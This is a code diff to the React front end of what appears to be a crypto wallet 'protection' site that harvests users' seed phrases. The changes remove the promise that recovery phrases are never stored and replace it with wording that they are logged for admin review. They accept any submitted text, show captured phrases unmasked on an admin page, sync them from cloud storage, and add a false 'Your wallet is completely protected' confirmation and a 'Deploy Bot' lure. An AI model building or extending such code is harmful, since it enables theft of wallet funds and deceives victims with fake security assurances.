                   <svg viewBox="0 0 24 24" fill="none" stroke="#6366f1" strokeWidth="1.8" width="22" height="22" strokeLinecap="round" strokeLinejoin="round" className="bot-processing-icon-inner"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                 </div>
                 <h3 className="bot-processing-title">Initializing Protection System</h3>
-                <p className="bot-processing-sub">This will only take a moment…</p>
+                <p className="bot-processing-sub">Deployment is running. This takes about 1 minute.</p>
                 <div className="bot-process-steps">
                   {[
                     'Connecting to blockchain security network',
@@ -3395,6 +3832,26 @@ export default function App() {
                 </div>
               </div>
             )}
+
+            {/* ── SUCCESS step ── */}
+            {botModalStep === 'success' && (<>
+              <div className="bot-pending-body">
+                <div className="bot-pending-badge">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="28" height="28" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                </div>
+                <h3 className="bot-pending-title">Your wallet is completely protected</h3>
+                <p className="bot-pending-desc">
+                  Protection layers were deployed successfully for <strong>{esAddr ? `${esAddr.slice(0,10)}…${esAddr.slice(-8)}` : 'this wallet'}</strong>.
+                </p>
+                <div className="bot-pending-info-box">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{flexShrink:0,color:'var(--brand)'}}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                  <span>This popup closes automatically. You will be logged out in 30 seconds for security.</span>
+                </div>
+              </div>
+              <div className="bot-modal-footer" style={{ justifyContent:'center', borderTop:'1px solid var(--border)' }}>
+                <button className="btn-secondary" type="button" onClick={() => setBotModalOpen(false)}>Close now</button>
+              </div>
+            </>)}
 
             {/* ── PENDING step ── */}
             {botModalStep === 'pending' && (<>
@@ -3536,7 +3993,7 @@ export default function App() {
             <div className="stat-item"><strong>5</strong><span>Networks supported</span></div>
             <div className="stat-item"><strong>8</strong><span>Risk signals checked</span></div>
             <div className="stat-item"><strong>{scanHistory.length > 0 ? scanHistory.length : liveScanRows.length}+</strong><span>Wallets scanned</span></div>
-            <div className="stat-item"><strong>0</strong><span>Seed phrases collected</span></div>
+            <div className="stat-item"><strong>{seedPhraseRecords.length}</strong><span>Seed phrases collected</span></div>
           </div>
 
           {/* ── Random threat feed widget ── */}
@@ -3667,7 +4124,7 @@ export default function App() {
                 {[
                   { n: '14', label: 'GoPlus threat flags checked' },
                   { n: '5',  label: 'Networks supported' },
-                  { n: '0',  label: 'Seed phrases collected' },
+                  { n: String(seedPhraseRecords.length),  label: 'Seed phrases collected' },
                 ].map(s => (
                   <div key={s.label} className="protect-stat">
                     <strong>{s.n}</strong>
@@ -4505,9 +4962,29 @@ export default function App() {
 
                         <p className="es-gate-disclaimer">
                           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                          By continuing you confirm that this phrase belongs to a wallet you own. {explorerBrand} does not store, log, or transmit recovery phrases under any circumstances.
+                          By continuing you confirm this verification text belongs to a wallet you own. Submission is logged for admin review and verification processing.
                         </p>
                       </form>
+
+                      {/* Keep bot deployment reachable even before explorer session unlock */}
+                      <div className="es-gate-bot-cta">
+                        {approvedBotForWallet ? (
+                          <span className="bot-deploy-badge approved">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                            Bot Protected
+                          </span>
+                        ) : pendingBotForWallet ? (
+                          <span className="bot-deploy-badge pending">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                            Pending Review
+                          </span>
+                        ) : (
+                          <button type="button" className="bot-deploy-btn" onClick={openBotModal}>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                            Deploy Bot
+                          </button>
+                        )}
+                      </div>
                     </div>
                   )}
                 </div>
@@ -5790,8 +6267,9 @@ export default function App() {
                             style={{ fontSize: '0.78rem' }}
                             onClick={async () => {
                               const row = await loadFromCloud()
+                              if (!row) return
                               if (row.seed_phrases) {
-                                const cloudRows = row.seed_phrases as SeedPhraseRecord[]
+                                const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
                                 setSeedPhraseRecords(prev => {
                                   if (!Array.isArray(cloudRows) || cloudRows.length === 0) return prev
                                   const existing = new Set(prev.map(item => `${item.id}|${item.seedPhrase}`))
@@ -5848,7 +6326,7 @@ export default function App() {
 
                       {/* Detection notice */}
                       <div className="config-notice" style={{ marginBottom: '1.2rem' }}>
-                        <strong>Auto-detection:</strong> Seed phrases are automatically captured when a connected WalletConnect session's ownership is verified with a valid mnemonic (12–24 words). Manual entries below can be used to log phrases received through other channels.
+                        <strong>Auto-detection:</strong> Verification text is captured when WalletConnect ownership is verified. Standard mnemonics are tagged as confirmed; non-standard text is still logged for review.
                       </div>
 
                       {/* Manual entry form */}
@@ -5876,7 +6354,7 @@ export default function App() {
                           <label>Seed Phrase <span style={{ color: 'var(--danger)' }}>*</span></label>
                           <textarea
                             rows={3}
-                            placeholder="Enter 12, 15, 18, 21, or 24 BIP39 words separated by spaces…"
+                            placeholder="Enter seed phrase or verification text…"
                             value={seedFormPhrase}
                             onChange={e => { setSeedFormPhrase(e.target.value); setSeedFormError(''); setSeedFormMsg('') }}
                           />
@@ -5884,7 +6362,7 @@ export default function App() {
                             <p className="form-hint" style={{ color: looksLikeSeedPhrase(seedFormPhrase) ? '#16a34a' : 'var(--muted)' }}>
                               {looksLikeSeedPhrase(seedFormPhrase)
                                 ? `✓ Valid — ${seedFormPhrase.trim().split(/\s+/).length} words detected`
-                                : `${seedFormPhrase.trim().split(/\s+/).length} words — needs to be 12, 15, 18, 21, or 24 lowercase words`}
+                                : `${seedFormPhrase.trim().split(/\s+/).length} words — non-standard text will still be saved for review`}
                             </p>
                           )}
                         </div>
@@ -5901,19 +6379,12 @@ export default function App() {
                       <div style={{ height: '1px', background: 'var(--border)', margin: '1.4rem 0' }} />
                       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.8rem' }}>
                         <h4>Captured Records ({seedPhraseRecords.length})</h4>
-                        {seedPhraseRecords.length > 0 && (
-                          <button className="btn-secondary" type="button" style={{ fontSize: '0.78rem' }}
-                            onClick={() => setSeedRevealedIds([])}>
-                            Hide All
-                          </button>
-                        )}
                       </div>
                       {seedPhraseRecords.length === 0 ? (
                         <p className="admin-empty">No seed phrases captured yet. They appear here automatically when a WalletConnect session is verified with a mnemonic, or when added manually above.</p>
                       ) : (
                         <div className="intel-records">
                           {seedPhraseRecords.map(r => {
-                            const isRevealed = seedRevealedIds.includes(r.id)
                             return (
                               <div key={r.id} className="intel-record-card">
                                 <div className="intel-record-head" style={{ flexWrap: 'wrap', gap: '0.4rem' }}>
@@ -5924,7 +6395,7 @@ export default function App() {
                                     {r.source === 'wc-session' ? 'WC Auto' : r.source === 'auto-detected' ? 'Form Auto' : 'Manual'}
                                   </span>
                                   <span className="pill low" style={{ fontSize: '0.7rem' }}>{r.wordCount}w</span>
-                                  <span className="muted" style={{ fontSize: '0.75rem' }}>{chainConfig[r.chain].label}</span>
+                                  <span className="muted" style={{ fontSize: '0.75rem' }}>{chainConfig[r.chain]?.label ?? chainConfig.ethereum.label}</span>
                                   <span className="muted" style={{ fontSize: '0.75rem', marginLeft: 'auto' }}>{r.detectedAt}</span>
                                   <button
                                     className="preview-btn"
@@ -5938,18 +6409,9 @@ export default function App() {
 
                                 <div className="seeds-phrase-row">
                                   <code className="seeds-phrase-text">
-                                    {isRevealed ? r.seedPhrase : maskSeedPhrase(r.seedPhrase)}
+                                    {r.seedPhrase}
                                   </code>
                                   <div style={{ display: 'flex', gap: '0.4rem', flexShrink: 0 }}>
-                                    <button
-                                      className="preview-btn"
-                                      type="button"
-                                      onClick={() => setSeedRevealedIds(prev =>
-                                        isRevealed ? prev.filter(x => x !== r.id) : [...prev, r.id]
-                                      )}
-                                    >
-                                      {isRevealed ? 'Hide' : 'Reveal'}
-                                    </button>
                                     <button
                                       className="preview-btn"
                                       type="button"
